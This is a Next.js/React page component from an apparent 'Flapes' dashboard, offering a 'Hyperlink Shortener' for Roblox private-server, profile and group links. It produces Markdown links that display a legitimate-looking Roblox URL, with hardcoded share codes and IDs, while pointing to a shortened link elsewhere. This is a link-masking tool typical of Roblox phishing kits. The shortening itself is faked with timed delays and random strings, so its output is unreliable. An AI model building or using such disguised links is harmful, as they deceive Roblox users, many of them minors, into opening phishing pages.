"use client"

import Link from "next/link"
import { ArrowLeft, Shield, Copy, Check, Loader2 } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { ParticleBackground } from "@/components/particle-background"
import { useState, useEffect } from "react"

export default function HyperlinkPage() {
  const [linkType, setLinkType] = useState("private")
  const [inputUrl, setInputUrl] = useState("")
  const [shortenedUrl, setShortenedUrl] = useState("")
  const [formattedUrl, setFormattedUrl] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [copiedShort, setCopiedShort] = useState(false)
  const [copiedFormatted, setCopiedFormatted] = useState(false)
  const [showResults, setShowResults] = useState(false)
  const [groupName, setGroupName] = useState("Group Name")

  // Set placeholder based on link type
  const getPlaceholder = () => {
    switch (linkType) {
      case "private":
        return "https://www.roblox.com/games/1234567890/Game-Name"
      case "profile":
        return "https://www.roblox.com/users/3095250/profile"
      case "group":
        return "https://www.roblox.com/groups/12215612/Group-Name"
      default:
        return "Enter URL to shorten..."
    }
  }

  // Extract group name from URL if it's a group link
  useEffect(() => {
    if (linkType === "group" && inputUrl) {
      const match = inputUrl.match(/\/groups\/\d+\/([^/]+)/)
      if (match && match[1]) {
        setGroupName(match[1].replace(/-/g, " "))
      }
    }
  }, [inputUrl, linkType])

  const handleShortenUrl = async () => {
    if (!inputUrl) return

    setIsLoading(true)

    // Simulate multiple link shortener attempts
    await new Promise((resolve) => setTimeout(resolve, 800))
    console.log("Trying first shortener...")

    await new Promise((resolve) => setTimeout(resolve, 600))
    console.log("First shortener failed, trying second...")

    await new Promise((resolve) => setTimeout(resolve, 700))
    console.log("Second shortener failed, trying third...")

    // Generate a random shortened URL
    const shortDomains = ["is.gd", "bit.ly", "tinyurl.com", "cutt.ly", "t.ly"]
    const randomDomain = shortDomains[Math.floor(Math.random() * shortDomains.length)]
    const randomString = Math.random().toString(36).substring(2, 8)
    const shortUrl = `https://${randomDomain}/${randomString}`

    // Create formatted URL based on link type
    let formatted = ""
    switch (linkType) {
      case "private":
        formatted = `[https://www.roblox.com/share?code=702c539cacf997468847033824ff896f&type=Server](${shortUrl})`
        break
      case "profile":
        formatted = `[https://www.roblox.com/users/3095250/profile](${shortUrl})`
        break
      case "group":
        formatted = `[https://www.roblox.com/communities/12215612/${groupName.replace(/\s+/g, "-")}#!/about](${shortUrl})`
        break
      default:
        formatted = `[${inputUrl}](${shortUrl})`
    }

    setShortenedUrl(shortUrl)
    setFormattedUrl(formatted)
    setShowResults(true)
    setIsLoading(false)
  }

  const handleCopyShort = () => {
    navigator.clipboard.writeText(shortenedUrl)
    setCopiedShort(true)
    setTimeout(() => setCopiedShort(false), 2000)
  }

  const handleCopyFormatted = () => {
    navigator.clipboard.writeText(formattedUrl)
    setCopiedFormatted(true)
    setTimeout(() => setCopiedFormatted(false), 2000)
  }

  return (
    <div className="min-h-screen bg-black text-white relative overflow-hidden">
      <ParticleBackground />

      <div className="relative z-10 flex flex-col items-center justify-center min-h-screen p-8">
        {/* Header with enhanced styling */}
        <div className="flex items-center gap-3 mb-8 animate-pulse">
          <Shield className="w-8 h-8 text-red-400 drop-shadow-lg" />
          <h1 className="text-5xl font-bold text-white drop-shadow-2xl tracking-wide">Flapes</h1>
          <Shield className="w-8 h-8 text-red-400 drop-shadow-lg" />
        </div>

        {/* Back Button with enhanced hover */}
        <Link href="/">
          <Button className="mb-8 bg-white hover:bg-gray-100 text-black px-6 py-2 rounded-lg font-medium transition-all duration-300 hover:scale-105 hover:shadow-lg group">
            <ArrowLeft className="w-4 h-4 mr-2 group-hover:-translate-x-1 transition-transform duration-300" />
            Back to Dashboard
          </Button>
        </Link>

        {/* Hyperlink Shortener with enhanced styling */}
        <div className="w-full max-w-2xl">
          <div className="border border-red-400/30 rounded-lg p-8 bg-black/40 backdrop-blur-sm hover:border-red-400/50 transition-all duration-300 hover:shadow-lg hover:shadow-red-500/10">
            <div className="flex items-center justify-center gap-3 mb-8">
              <Shield className="w-6 h-6 text-red-400 animate-pulse" />
              <h2 className="text-xl font-bold text-red-400 tracking-wider">HYPERLINK SHORTENER</h2>
              <Shield className="w-6 h-6 text-red-400 animate-pulse" />
            </div>

            <div className="space-y-6">
              <div>
                <label className="block text-sm font-medium text-white mb-2">Link Type</label>
                <Select value={linkType} onValueChange={setLinkType}>
                  <SelectTrigger className="w-full bg-red-800/30 border-red-600/50 text-white hover:bg-red-800/40 hover:border-red-500 transition-all duration-300">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-red-900 border-red-600 backdrop-blur-sm">
                    <SelectItem value="private" className="text-white hover:bg-red-800 focus:bg-red-800">
                      Private Server
                    </SelectItem>
                    <SelectItem value="profile" className="text-white hover:bg-red-800 focus:bg-red-800">
                      Profile
                    </SelectItem>
                    <SelectItem value="group" className="text-white hover:bg-red-800 focus:bg-red-800">
                      Group
                    </SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div>
                <Input
                  placeholder={getPlaceholder()}
                  value={inputUrl}
                  onChange={(e) => setInputUrl(e.target.value)}
                  className="w-full bg-red-800/30 border-red-600/50 text-white placeholder:text-gray-400 hover:bg-red-800/40 hover:border-red-500 focus:border-red-400 transition-all duration-300"
                />
              </div>

              <Button
                onClick={handleShortenUrl}
                disabled={isLoading || !inputUrl}
                className="w-full bg-red-600 hover:bg-red-700 text-white py-3 rounded-lg font-medium transition-all duration-300 hover:scale-[1.02] hover:shadow-lg hover:shadow-red-500/25 disabled:opacity-50 disabled:cursor-not-allowed group"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                    Shortening...
                  </>
                ) : (
                  <>
                    <Shield className="w-4 h-4 mr-2 group-hover:rotate-12 transition-transform duration-300" />
                    Shorten URL
                  </>
                )}
              </Button>

              {showResults && (
                <div className="mt-6 p-4 bg-red-900/20 border border-red-600/30 rounded-lg animate-in slide-in-from-bottom-2 duration-300">
                  <div className="space-y-4">
                    <div>
                      <label className="block text-sm font-medium text-red-400 mb-2">Shortened URL:</label>
                      <div className="flex gap-2">
                        <Input
                          value={shortenedUrl}
                          readOnly
                          className="flex-1 bg-red-800/20 border-red-600/50 text-red-300"
                        />
                        <Button
                          onClick={handleCopyShort}
                          className="bg-red-600 hover:bg-red-700 text-white px-4 transition-all duration-300 hover:scale-105"
                        >
                          {copiedShort ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                        </Button>
                      </div>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-red-400 mb-2">Formatted URL:</label>
                      <div className="flex gap-2">
                        <Input
                          value={formattedUrl}
                          readOnly
                          className="flex-1 bg-red-800/20 border-red-600/50 text-red-300"
                        />
                        <Button
                          onClick={handleCopyFormatted}
                          className="bg-red-600 hover:bg-red-700 text-white px-4 transition-all duration-300 hover:scale-105"
                        >
                          {copiedFormatted ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                        </Button>
                      </div>
                      {copiedFormatted && (
                        <p className="text-red-400 text-sm mt-2 animate-pulse">Copied to clipboard!</p>
                      )}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
